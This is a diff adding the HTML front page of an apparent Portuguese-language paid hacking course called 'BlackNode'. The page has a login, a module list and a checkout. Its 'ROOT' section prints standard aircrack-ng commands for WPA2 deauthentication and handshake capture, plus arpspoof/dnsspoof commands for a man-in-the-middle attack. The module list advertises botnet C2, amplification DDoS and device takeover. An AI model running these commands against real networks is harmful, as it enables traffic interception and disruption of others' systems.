@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlackNode | Cybersec Training</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <canvas id="matrixCanvas"></canvas>
+
+    <div class="scanlines"></div>
+
+    <header>
+        <div class="container nav-container">
+            <div class="logo">BLACKNODE <span class="blink">_</span></div>
+<nav>
+    <ul id="navMenu">
+        <li><a href="#root">/ROOT</a></li>
+        <li><a href="#modules">/MODULES</a></li>
+        <li><a href="#login" class="btn-login" id="loginBtn">LOGIN</a></li>
+    </ul>
+</nav>
+
+
+        </div>
+    </header>
+    <section id="root" class="content-section">
+    <div class="container">
+        <h2 class="hacker-hover root-title" data-value="BEM-VINDO AO ROOT">
+            BEM-VINDO AO ROOT
+        </h2>
+
+        <p class="root-text">
+            >> Você está agora no nível <span class="neon-green">ROOT</span>.<br>
+            >> Abaixo estão exemplos práticos das ações descritas nos módulos.
+        </p>
+
+        <div class="root-block">
+            <h3>01. Captura de Handshake WPA2</h3>
+            <pre class="code-block"><code>
+# Colocar interface em modo monitor
+airmon-ng start wlan0
+
+# Capturar handshakes
+airodump-ng wlan0mon
+
+# Ataque de desautenticação
+aireplay-ng -0 10 -a [BSSID] wlan0mon
+            </code></pre>
+        </div>
+
+        <div class="root-block">
+            <h3>02. DNS Spoofing (MITM)</h3>
+            <pre class="code-block"><code>
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t VITIMA GATEWAY
+dnsspoof -i eth0
+            </code></pre>
+        </div>
+
+        <div class="root-block">
+            <h3>03. Stress Test Controlado (DDoS)</h3>
+            <pre class="code-block"><code>
+# Teste de carga HTTP
+ab -n 1000 -c 100 http://alvo-teste.local/
+            </code></pre>
+        </div>
+    </div>
+</section>
+
+<section id="dashboard" class="content-section">
+    <div class="container">
+
+        <h2 class="root-title">
+            BEM-VINDO, <span class="neon-green" id="userNameDisplay">USER</span>
+        </h2>
+
+        <p class="root-text">
+            >> Sessão autenticada.<br>
+            >> Acesso total aos módulos, videoaulas e ambientes de código.
+        </p>
+
+        <div class="root-block">
+            <h3>📚 CURSOS DISPONÍVEIS</h3>
+            <pre class="code-block"><code>
+01. WiFi Hacking Avançado
+02. Ataques MITM
+03. DDoS & Stress Testing
+04. Mobile & IoT Exploitation
+            </code></pre>
+        </div>
+
+        <div class="root-block">
+            <h3>🎥 VIDEOAULAS</h3>
+            <pre class="code-block"><code>
+✔ Introdução ao ambiente
+✔ Configuração de ferramentas
+✔ Execução de ataques controlados
+            </code></pre>
+        </div>
+
+        <div class="root-block">
+            <h3>💻 CÓDIGOS</h3>
+            <pre class="code-block"><code>
+[1] Abrir códigos já criados
+[2] Iniciar novo código
+[3] Salvar sessão atual
+            </code></pre>
+        </div>
+
+    </div>
+</section>
+
+
+
+   <main>
+    <section id="home" class="content-section active">
+        <div class="container hero">
+            <p class="subtitle">>> ESTABELECENDO CONEXÃO SEGURA...</p>
+            <h1 class="glitch-text" data-value="DOMINE O SISTEMA">DOMINE O SISTEMA</h1>
+            <a href="javascript:void(0)" onclick="showSection('modules')" class="btn-primary">VER MÓDULOS</a>
+        </div>
+    </section>
+
+    <section id="login" class="content-section">
+        <div class="container">
+            <div class="login-box">
+                <h2 class="hacker-hover" data-value="IDENTIFIQUE-SE">IDENTIFIQUE-SE</h2>
+                <input type="text" placeholder="USER_ID" class="hacker-input">
+                <input type="password" placeholder="PASS_HASH" class="hacker-input">
+                <button class="btn-primary" style="width:100%">INVASÃO NO SISTEMA</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="modules" class="content-section">
+        <div class="container">
+            <h2 class="section-title">DETALHES DO TREINAMENTO</h2>
+            <div class="module-detail-grid">
+                <div class="module-item">
+                    <h3>01. Redes e WiFi Hacking</h3>
+                    <ul>
+                        <li>* Quebra de handshakes WPA2/WPA3</li>
+                        <li>* Criação de Rogue Access Points (Gêmeo Maligno)</li>
+                        <li>* DNS Spoofing e Interceptação de tráfego</li>
+                    </ul>
+                </div>
+                <div class="module-item">
+                    <h3>02. Ataques DDoS e Botnets</h3>
+                    <ul>
+                        <li>* Protocolos de amplificação (NTP, DNS, Memcached)</li>
+                        <li>* Gestão de C2 (Command and Control)</li>
+                        <li>* Stress Testing de infraestruturas críticas</li>
+                    </ul>
+                </div>
+                <div class="module-item">
+                    <h3>03. Mobile & IoT</h3>
+                    <ul>
+                        <li>* Exploração de portas abertas em câmeras IP</li>
+                        <li>* Bypass de autenticação em roteadores</li>
+                        <li>* Controle remoto de dispositivos Android</li>
+                    </ul>
+                </div>
+            </div>
+            <center><button class="btn-primary" onclick="showSection('checkout')">IR PARA PAGAMENTO</button></center>
+        </div>
+    </section>
+
+    <section id="checkout" class="content-section">
+        <div class="container checkout-container">
+            <div class="checkout-box">
+                <h2>FINALIZAR ACESSO</h2>
+                <div class="billing-grid">
+                    <div class="form-side">
+                        <input type="text" placeholder="NOME COMPLETO" class="hacker-input">
+                        <input type="email" placeholder="EMAIL_PARA_CHAVE_ACESSO" class="hacker-input">
+                        <select class="hacker-input" id="paymentMethod" onchange="updatePaymentDetails()">
+                            <option value="pix">PAGAMENTO VIA PIX (10% OFF)</option>
+                            <option value="boleto">BOLETO BANCÁRIO</option>
+                            <option value="card">CARTÃO DE CRÉDITO</option>
+                        </select>
+                    </div>
+                    <div class="summary-side">
+                        <p>VALOR DO ACESSO: <span id="totalValue">R$ 1.400,00</span></p>
+                        <div id="installments" class="neon-green">
+                            Ou 12x de R$ 116,66 sem juros
+                        </div>
+                        <div id="paymentDisplay" style="margin-top:20px;">
+                            <p id="paymentText">Aguardando seleção...</p>
+                        </div>
+                    </div>
+                </div>
+                <button class="btn-primary" style="width:100%; margin-top:30px;">GERAR ACESSO</button>
+            </div>
+        </div>
+    </section>
+</main>
+
+    <footer>
+        <p>BLACKNODE ACADEMY © 2025 // ETHICAL HACKING ONLY</p>
+    </footer>
+
+    <div id="modal" class="modal-overlay">
+        <div class="modal-content">
+            <span class="close-modal">&times;</span>
+            <h2 id="modal-title">NOME DO CURSO</h2>
+            <div class="terminal-logs">
+                <p>> Verificando disponibilidade...</p>
+                <p>> Criptografando transação...</p>
+                <p>> Preço: <span id="modal-price" class="neon-green">R$ 0,00</span></p>
+            </div>
+            <p>Deseja iniciar o protocolo de compra?</p>
+            <button class="btn-primary" style="width: 100%; margin-top: 15px;">CONFIRMAR PAGAMENTO</button>
+        </div>
+    </div>
+
+    <script src="z.js"></script>
+</body>
+</html>
